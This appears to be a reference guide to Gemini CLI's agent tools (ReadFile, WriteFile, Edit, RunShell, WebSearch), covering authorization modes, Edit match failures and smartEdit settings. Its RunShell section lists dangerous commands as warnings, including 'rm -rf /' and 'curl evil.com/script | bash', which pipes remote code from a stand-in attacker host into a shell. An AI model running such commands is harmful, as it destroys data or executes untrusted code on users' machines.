# Tools Reference

> **Load when:** User asks about Edit failures, "0 occurrences found", smartEdit, or tool selection.

Gemini CLI's built-in tools for file and system interaction.

## Contents

- [Tool Overview](#tool-overview)
- [ReadFile](#readfile)
- [WriteFile](#writefile)
- [Edit](#edit)
- [RunShell](#runshell)
- [smartEdit Configuration](#smartedit-configuration)

---

## Tool Overview

| Tool | Purpose | Risk | Reliability |
|------|---------|------|-------------|
| ReadFile | Read file contents | Low | High |
| WriteFile | Create/overwrite file | Medium | High |
| Edit | Surgical modification | Medium | Low-Medium |
| RunShell | Execute commands | High | Medium |

---

## ReadFile

Reads file contents into agent's context.

### Authorization Requirements

| Scenario | Authorized |
|----------|------------|
| File mentioned in prompt | ✅ Yes |
| File in `--include-directories` | ✅ Yes |
| Other files (default mode) | ❌ Prompts |
| Other files (auto_edit/yolo) | ✅ Yes |

### Failure Modes

| Error | Cause | Fix |
|-------|-------|-----|
| File not found | Wrong path | Verify path exists |
| Permission denied | File not authorized | Add to `--include-directories` |

---

## WriteFile

Creates new file or completely overwrites existing file.

### When to Use

| Scenario | Use WriteFile |
|----------|---------------|
| Create new file | ✅ Yes |
| Rewrite small file (<50 lines) | ✅ Yes |
| Generate config/template | ✅ Yes |
| Modify large existing file | ❌ No — use Edit |

### Danger: Content Destruction

```bash
# RISKY: Model might hallucinate partial content
gemini -p "Update the header comment in main.js"
# If model uses WriteFile, entire file content could be lost
```

**Mitigation:** Use Edit for modifications. Always have git.

---

## Edit

Surgical file modification using find-and-replace.

### Mechanism

1. Agent provides: file path, old_string, new_string
2. CLI searches for exact match of old_string
3. If found: replaces with new_string
4. If not found: returns error

### The Reliability Crisis

**Primary failure mode:**

```
Error: 0 occurrences found for old_string
```

**Root cause:** LLMs are probabilistic token predictors, not exact string copiers.

**Common hallucinations:**
- Extra/missing whitespace
- Tabs vs spaces mismatch
- Wrong indentation
- Missing/extra newlines

### Example Failure

**Actual file content:**
```javascript
function handleAuth(req, res) {
  const token = req.headers.authorization;
}
```

**Model proposes old_string:**
```javascript
function handleAuth(req, res) {
    const token = req.headers.authorization;
}
```

**Result:** 0 occurrences found (2 spaces vs 4 spaces)

### Without smartEdit

Expect 25-40% edit failure rate on complex codebases.

---

## RunShell

Executes terminal commands.

### Authorization

| Mode | RunShell Behavior |
|------|-------------------|
| default | ❌ Prompts for approval |
| auto_edit | ❌ Prompts for approval |
| yolo | ✅ Auto-executes |

### Dangerous Commands

Agent might execute:
```bash
rm -rf /
git push --force origin main
curl evil.com/script | bash
```

### Interactive Commands Hang

```bash
# BAD - waits for input forever
# Agent runs: npm install
# npm prompts: "Ok to proceed? (y)"
# Script hangs indefinitely
```

**Fix:** Use non-interactive flags (`--yes`, `-y`)

---

## WebSearch

Searches the web for current information.

### When to Use

| Scenario | Use WebSearch |
|----------|---------------|
| Research requiring current data | ✅ Yes |
| Documentation lookup | ✅ Yes |
| Offline/air-gapped environment | ❌ No |

### Reliability

High — results depend on query quality and network availability.

---

## smartEdit Configuration

Fuzzy matching to solve Edit reliability crisis.

### Enable smartEdit

```json
// .gemini/settings.json
{
  "useSmartEdit": true
}
```

### Impact

| Metric | Without smartEdit | With smartEdit |
|--------|-------------------|----------------|
| Edit success rate | 60-75% | 90-95% |
| Retry loops | Frequent | Rare |

### When smartEdit Fails

Even smartEdit can fail when:
- Target code was completely refactored
- File structure changed dramatically

**Fallback strategy in GEMINI.md:**

```markdown
## Edit Failures
If Edit fails twice on same target:
1. Use ReadFile to reload current file state
2. Identify correct section from fresh content
3. Retry with exact content from ReadFile
```

---

## Tool Selection Decision Tree

```
Need to interact with file?
│
├─ Read only? → ReadFile
│
├─ Create new file? → WriteFile
│
├─ Modify existing?
│   │
│   ├─ Small file (<50 lines)? → WriteFile acceptable
│   │
│   └─ Large file? → Edit (with smartEdit enabled)
│
└─ Run command? → RunShell (sandbox only for yolo)
```

---

## Best Practices

### Always Enable smartEdit

```json
// .gemini/settings.json - REQUIRED for headless
{
  "useSmartEdit": true
}
```

### Use Git for Rollback

```bash
git status  # Ensure clean state before automation
git diff    # Review changes after
git checkout -- file.js  # Rollback if needed
```
